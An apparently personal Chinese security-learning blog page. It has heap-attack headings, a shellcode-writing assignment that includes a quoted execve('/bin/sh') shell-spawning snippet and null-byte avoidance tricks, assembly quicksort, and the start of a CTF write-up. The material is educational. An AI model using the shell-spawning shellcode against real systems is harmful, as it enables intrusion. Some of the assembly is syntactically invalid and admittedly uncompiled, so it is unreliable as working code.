<h2 id="堆的工作流程"><a href="#堆的工作流程" class="headerlink" title="堆的工作流程"></a>堆的工作流程</h2><h3 id="malloc的工作流程"><a href="#malloc的工作流程" class="headerlink" title="malloc的工作流程"></a>malloc的工作流程</h3><h3 id="free的工作流程"><a href="#free的工作流程" class="headerlink" title="free的工作流程"></a>free的工作流程</h3><h2 id="堆有关的攻击手段"><a href="#堆有关的攻击手段" class="headerlink" title="堆有关的攻击手段"></a>堆有关的攻击手段</h2><h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><h3 id="Heap-Overflow"><a href="#Heap-Overflow" class="headerlink" title="Heap Overflow"></a>Heap Overflow</h3><h3 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h3><h3 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h3>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/01/16/First-Assignment-from-Kap0k/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/16/First-Assignment-from-Kap0k/" class="post-title-link" itemprop="url">First Assignment from Kap0k</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-01-16 00:26:45" itemprop="dateCreated datePublished" datetime="2021-01-16T00:26:45+08:00">2021-01-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-01-17 21:44:14" itemprop="dateModified" datetime="2021-01-17T21:44:14+08:00">2021-01-17</time>
              </span>

          
            <span id="/2021/01/16/First-Assignment-from-Kap0k/" class="post-meta-item leancloud_visitors" data-flag-title="First Assignment from Kap0k" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/01/16/First-Assignment-from-Kap0k/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/01/16/First-Assignment-from-Kap0k/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="手撕shellcode"><a href="#手撕shellcode" class="headerlink" title="手撕shellcode"></a>手撕shellcode</h2><p>最后的结果是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x31\xc0\x50\x68\x66\x69\x6c\x65\x68\x74\x65\x73\x74\x89\xe3\x50\x53\x31\xc9\xb1\x02\xb0\x05\xcd\x80\x89\xc3\x31\xc0\x50\x68\x6f\x72\x6c\x64\x68\x6f\x2c\x20\x77\x68\x68\x65\x6c\x6c\x89\xe1\x50\x51\x31\xd2\xb2\x0c\xb0\x04\xcd\x80\x31\xdb\x31\xc0\xb0\x01\xcd\x80</span><br></pre></td></tr></table></figure>
<h3 id="最初的思路"><a href="#最初的思路" class="headerlink" title="最初的思路"></a>最初的思路</h3><p>查了很久资料，最后才在google上找到有用的东西。（用i386编译出来的）</p>
<p>最简单的写法自然是这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db &quot;Hello, world!&quot;, 0xa</span><br><span class="line">    len equ $ - msg</span><br><span class="line">    filename db &quot;sb&quot;</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">    ;xor edx, edx</span><br><span class="line">    mov ecx, 2</span><br><span class="line">    mov ebx, filename</span><br><span class="line">    mov eax, 5</span><br><span class="line">    int 0x80</span><br><span class="line">    </span><br><span class="line">    mov ebx, eax</span><br><span class="line">    mov ecx, msg</span><br><span class="line">    mov edx, 12</span><br><span class="line">    mov eax, 4</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">    mov ebx, 0</span><br><span class="line">    mov eax, 1</span><br><span class="line">    int 0x80</span><br></pre></td></tr></table></figure>
<p>这里所运用到的是linux kernel里面的syscall指令，通过<code>int 0x80</code>的软中断来执行底层函数。</p>
<p>我们用到的有<code>sys_open</code>和<code>sys_write</code>两个函数，他们的用法如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4.</span> sys_write</span><br><span class="line">Syntax: <span class="function"><span class="keyword">ssize_t</span> <span class="title">sys_write</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">char</span> * buf, <span class="keyword">size_t</span> count)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">Source: fs/read_write.c</span><br><span class="line"></span><br><span class="line">Action: write to a file descriptor</span><br><span class="line"></span><br><span class="line">Details:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">5.</span> sys_open</span><br><span class="line">Syntax: <span class="function"><span class="keyword">int</span> <span class="title">sys_open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * filename, <span class="keyword">int</span> flags, <span class="keyword">int</span> mode)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">Source: fs/open.c</span><br><span class="line"></span><br><span class="line">Action: open <span class="keyword">and</span> possibly create a file <span class="keyword">or</span> device</span><br><span class="line"></span><br><span class="line">Details:</span><br></pre></td></tr></table></figure>
<p><code>sys_open</code>的第二个参数<code>flags</code>中，<code>0</code>代表只读，<code>1</code>代表只写，<code>2</code>代表可读写。</p>
<p>这里试了一下，第三个参数可以不用去控制，默认留0没问题。</p>
<p>然后<code>sys_open</code>的返回值是一个文件描述数字，这个概念可以参考stdin是0，stdout是1，反正就是一个在<code>sys_write</code>调用的时候，第一个参数填的值。</p>
<p>然后就是照着规定填好寄存器，最后<code>int 0x80</code>调用一下就可以执行函数了。最后再<code>sys_exit</code>退出就可以了。</p>
<p>编译命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nasm -f elf helloworld.asm</span><br><span class="line">$ ld -m elf_i386 -s -o shellcode helloworld.o</span><br></pre></td></tr></table></figure>
<p>不过这样编译过后会发现机器码里面一大堆都是<code>\x00</code>，不符合要求；并且存在常量字符串，没法在shellcode中跳到里面的奇妙地址来读取字符串。</p>
<h3 id="Inspiration"><a href="#Inspiration" class="headerlink" title="Inspiration"></a>Inspiration</h3><p>在搜索如何从汇编到shellcode的过程中，看到了一个教怎么弄出shell的教程，它的汇编是这样的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xor    %eax,%eax</span><br><span class="line">push   %eax</span><br><span class="line">push   $0x68732f2f</span><br><span class="line">push   $0x6e69622f</span><br><span class="line">mov    %esp,%ebx</span><br><span class="line">push   %eax</span><br><span class="line">push   %ebx</span><br><span class="line">mov    %esp,%ecx</span><br><span class="line">mov    $0xb,%al</span><br><span class="line">int    $0x80</span><br></pre></td></tr></table></figure>
<p>仔细研究它的写法，我们下面的解决方案就来自这段汇编的细节。（其实改编下就能用了）</p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><h4 id="去除-x00"><a href="#去除-x00" class="headerlink" title="去除\x00"></a>去除\x00</h4><p>我们通过几个技巧来实现：</p>
<ol>
<li><code>mov eax, 0</code>转而通过<code>mov eax, eax</code>来实现。</li>
<li><code>mov eax, 1</code>转而通过<code>mov al, 1</code>来实现。（前提是eax高位也没问题）</li>
</ol>
<h4 id="在shellcode中注入常量字符串"><a href="#在shellcode中注入常量字符串" class="headerlink" title="在shellcode中注入常量字符串"></a>在shellcode中注入常量字符串</h4><p>我们没法把我们想要的字符串在被注入的程序中找到，所以还是得存在栈里面。</p>
<p>不过怎么存呢？通过push来存。</p>
<p>然后就有非常强的技巧：将字符串翻转后变成十六进制编码，每8位每8位的push进去，最后从栈顶开始的字符串就是我们想要的字符串。</p>
<p>但是又有问题：这样会不会又产生<code>\x00</code>？</p>
<p>其实有可能，所以我们无论如何，长度都补齐到4的整数倍。这样就可以保证没有<code>\x00</code>了。</p>
<p>最终我的shellcode输出至名字为<code>testfile</code>的文件中，输入内容为<code>hello, world</code>。</p>
<p>缺点是<code>testfile</code>必须要先存在然后才能写进去，这应该和我在<code>sys_open</code>的时候，<code>flags</code>的取值有关系。有时间的话再去探究这个参数到底该怎么取。</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/First-Assignment-from-Kap0k/objdump.png">
<p>最后通过一个在网上找到的命令，直接提取出了机器码，生成了shellcode，省去了一个字节一个字节手抄出来的麻烦：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -d .&#x2F;shellcode|grep &#39;[0-9a-f]:&#39;|grep -v &#39;file&#39;|cut -f2 -d:|cut -f1-6 -d&#39; &#39;|tr -s &#39; &#39;|tr &#39;\t&#39; &#39; &#39;|sed &#39;s&#x2F; $&#x2F;&#x2F;g&#39;|sed &#39;s&#x2F; &#x2F;\\x&#x2F;g&#39;|paste -d &#39;&#39; -s |sed &#39;s&#x2F;^&#x2F;&quot;&#x2F;&#39;|sed &#39;s&#x2F;$&#x2F;&quot;&#x2F;g&#39;</span><br></pre></td></tr></table></figure>
<h2 id="汇编快排"><a href="#汇编快排" class="headerlink" title="汇编快排"></a>汇编快排</h2><p>直接用汇编写出快排我做不到，就先写个c出来吧。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a[] = &#123;<span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> *a, <span class="keyword">int</span> *b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">qsort</span><span class="params">(<span class="keyword">int</span> *start, <span class="keyword">int</span> *end)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = (end - start);</span><br><span class="line">    <span class="keyword">int</span> pivot = *(start + (len &gt;&gt; <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">int</span> *i = start, *j = end;</span><br><span class="line">    <span class="keyword">while</span>(i &lt;= j) &#123;</span><br><span class="line">        <span class="keyword">while</span>(*i &lt; pivot) i++;</span><br><span class="line">        <span class="keyword">while</span>(*j &gt; pivot) j--;</span><br><span class="line">        <span class="keyword">if</span>(i &lt;= j) swap(i++, j--);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i &lt; end) qsort(i, end);</span><br><span class="line">    <span class="keyword">if</span>(start &lt; j) qsort(start, j);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    qsort(a, a + <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>后来发现汇编里面要写指针的话就好麻烦，干脆重新改一改：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">qsort</span><span class="params">(<span class="keyword">int</span> *a, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> pivot = a[mid];</span><br><span class="line">    <span class="keyword">int</span> i = l, j = r;</span><br><span class="line">    <span class="keyword">while</span>(i &lt;= j) &#123;</span><br><span class="line">        <span class="keyword">while</span>(a[i] &lt; pivot) i++;</span><br><span class="line">        <span class="keyword">while</span>(a[j] &gt; pivot) j--;</span><br><span class="line">        <span class="keyword">if</span>(i &lt;= j) swap(a, i++, j--);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i &lt; r) qsort(a, i, r);</span><br><span class="line">    <span class="keyword">if</span>(l &lt; j) qsort(a, l, j);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看了师傅的代码，发现可以用r8到r11的这4个寄存器来存，顿时方便了很多。<del>本来还以为要一直存在栈上</del></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line"></span><br><span class="line">section .data</span><br><span class="line">    a: dd 1, 1, 4, 5, 1, 4, 2, 0, 7, 7</span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">    mov rdi, a</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    mov rdx, 10</span><br><span class="line">    call qsort</span><br><span class="line">    mov rax, 60</span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">swap:</span><br><span class="line">    ; rdi: a, rsi: i, rdx: j</span><br><span class="line">    mov ebx, QWORD [rdi + 4 * rsi]</span><br><span class="line">    mov ecx, QWORD [rdi + 4 * rdx]</span><br><span class="line">    mov QWORD [rdi + 4 * rsi], ecx</span><br><span class="line">    mov QWORD [rdi + 4 * rdx], ebx</span><br><span class="line"></span><br><span class="line">qsort:</span><br><span class="line">    ; rdi: a, rsi: start, rdx: end</span><br><span class="line">    mov r8, rsi ; start</span><br><span class="line">    mov r9, rdx ; end</span><br><span class="line">    mov r10, r8 ; i</span><br><span class="line">    mov r11, r9 ; j</span><br><span class="line">    mov rbx, r9</span><br><span class="line">    add rbx, r8</span><br><span class="line">    sar rbx</span><br><span class="line">    mov ebx, DWORD [r8 + 4 * rbx]</span><br><span class="line">    loop:</span><br><span class="line">        cmp r10, r11</span><br><span class="line">        jg after_loop1</span><br><span class="line">        i_loop:</span><br><span class="line">            mov eax, DWORD [r8 + 4 * r10]</span><br><span class="line">            cmp eax, ebx</span><br><span class="line">            jge j_loop</span><br><span class="line">            inc r10</span><br><span class="line">            jmp i_loop</span><br><span class="line">        j_loop:</span><br><span class="line">            mov eax, DWORD [r8 + 4 * r11]</span><br><span class="line">            cmp eax, ebx</span><br><span class="line">            jle swap_i_j</span><br><span class="line">            dec r11</span><br><span class="line">            jmp j_loop</span><br><span class="line">        swap_i_j:</span><br><span class="line">            cmp r10, r11</span><br><span class="line">            jg loop</span><br><span class="line">            mov rdi, a</span><br><span class="line">            mov rsi, r10</span><br><span class="line">            mov rdx, r11</span><br><span class="line">            call swap</span><br><span class="line">            inc r8</span><br><span class="line">            dec r9</span><br><span class="line">            jmp loop</span><br><span class="line">    after_loop1:</span><br><span class="line">        cmp r10 r9</span><br><span class="line">        jge after_loop2</span><br><span class="line">        mov rdi, a</span><br><span class="line">        mov rsi, r10</span><br><span class="line">        mov rdx, r9</span><br><span class="line">        push r8</span><br><span class="line">        push r9</span><br><span class="line">        push r10</span><br><span class="line">        push r11</span><br><span class="line">        call qsort</span><br><span class="line">        pop r11</span><br><span class="line">        pop r10</span><br><span class="line">        pop r9</span><br><span class="line">        pop r8</span><br><span class="line"></span><br><span class="line">    after_loop2:</span><br><span class="line">        cmp r8 r11</span><br><span class="line">        jge return</span><br><span class="line">        mov rdi, a</span><br><span class="line">        mov rsi, r8</span><br><span class="line">        mov rdx, r11</span><br><span class="line">        push r8</span><br><span class="line">        push r9</span><br><span class="line">        push r10</span><br><span class="line">        push r11</span><br><span class="line">        call qsort</span><br><span class="line">        pop r11</span><br><span class="line">        pop r10</span><br><span class="line">        pop r9</span><br><span class="line">        pop r8</span><br><span class="line">    return:</span><br><span class="line">        ret</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>没编译过，不过觉得问题不大。但愿如此（x</p>
<p>Jan 17 upd：重新用熟悉的AT&amp;T语法自己手写了一遍汇编快排，这次用了指针，看上去比较清晰：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">.globl _start</span><br><span class="line">.section .data</span><br><span class="line">    array:</span><br><span class="line">        .int 1, 1, 4, 5, 1, 4, 2, 0, 7, 7</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">qsort:</span><br><span class="line">    # rdi: int* start, rsi: int* end</span><br><span class="line">    pushq %rbp</span><br><span class="line">    movq %rsp, %rbp</span><br><span class="line">    movq %rsi, %rax</span><br><span class="line">    subq %rdi, %rax</span><br><span class="line">    sar %rax</span><br><span class="line">    addq %rdi, %rax</span><br><span class="line">    movq %rdi, %r8 # start(backup)</span><br><span class="line">    movq %rsi, %r9 # end(backup)</span><br><span class="line">    movq %rdi, %rbx # i</span><br><span class="line">    movq %rsi, %rcx # j</span><br><span class="line">    jmp _init_loop</span><br><span class="line"> </span><br><span class="line">_init_loop:</span><br><span class="line">    cmpq %rbx, %rcx</span><br><span class="line">    jg _recursive1</span><br><span class="line">    jmp _i_loop</span><br><span class="line"></span><br><span class="line">_i_loop:</span><br><span class="line">    cmpq (%rbx), (%rax)</span><br><span class="line">    jge _j_loop</span><br><span class="line">    incq %rbx</span><br><span class="line">    jmp _i_loop</span><br><span class="line"></span><br><span class="line">_j_loop:</span><br><span class="line">    cmpq (%rcx), (%rax)</span><br><span class="line">    jle _swap</span><br><span class="line">    decq %rcx</span><br><span class="line">    jmp _j_loop</span><br><span class="line"></span><br><span class="line">_swap:</span><br><span class="line">    cmpq %rbx, %rcx</span><br><span class="line">    jg _init_loop</span><br><span class="line">    movq (%rbx), r10</span><br><span class="line">    movq (%rcx), r11</span><br><span class="line">    movq r10, (%rcx)</span><br><span class="line">    movq r11, (%rbx)</span><br><span class="line">    incq %rbx</span><br><span class="line">    decq %rcx</span><br><span class="line"></span><br><span class="line">_recursive1:</span><br><span class="line">    cmpq %rbx, %r9</span><br><span class="line">    jge _recursive2</span><br><span class="line">    movq %rbx, %rdi</span><br><span class="line">    movq %r9, %rsi</span><br><span class="line">    call _qsort</span><br><span class="line">    jmp _recursive2</span><br><span class="line"></span><br><span class="line">_recursive2:</span><br><span class="line">    cmpq %r8, %rcx</span><br><span class="line">    jge _after_loop</span><br><span class="line">    movq %r8, %rdi</span><br><span class="line">    movq %rcx, %rsi</span><br><span class="line">    call _qsort</span><br><span class="line">    jmp _after_loop</span><br><span class="line"></span><br><span class="line">_after_loop:</span><br><span class="line">    movq %rbp, %rsp</span><br><span class="line">    popq %rbp</span><br><span class="line">    retq</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    movq array, %rdi</span><br><span class="line">    lea (array, 10, 4), %rsi</span><br><span class="line">    call _qsort</span><br><span class="line">    movl $0, %edi</span><br><span class="line">    movl $60, %eax</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/flyoutsan/article/details/62237779">https://blog.csdn.net/flyoutsan/article/details/62237779</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/orlion/p/5765339.html">https://www.cnblogs.com/orlion/p/5765339.html</a></p>
<p>还有CSAPP的Chapter 3。不愧是CSAPP。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/01/14/Jan-14-Writeup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/14/Jan-14-Writeup/" class="post-title-link" itemprop="url">Jan 14 Writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-01-14 15:15:17" itemprop="dateCreated datePublished" datetime="2021-01-14T15:15:17+08:00">2021-01-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-01-16 00:26:04" itemprop="dateModified" datetime="2021-01-16T00:26:04+08:00">2021-01-16</time>
              </span>

          
            <span id="/2021/01/14/Jan-14-Writeup/" class="post-meta-item leancloud_visitors" data-flag-title="Jan 14 Writeup" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/01/14/Jan-14-Writeup/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/01/14/Jan-14-Writeup/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h2><p>傻了傻了，居然没想到用ROPgadget来找字符串，而只是在IDA Pro中看了而已。</p>
<p>system函数已经在Print函数中给出来了。只要有一个<code>/bin/sh</code>就够了。</p>
<p>但是这样也不准确，只需要<code>sh</code>就可以了。</p>
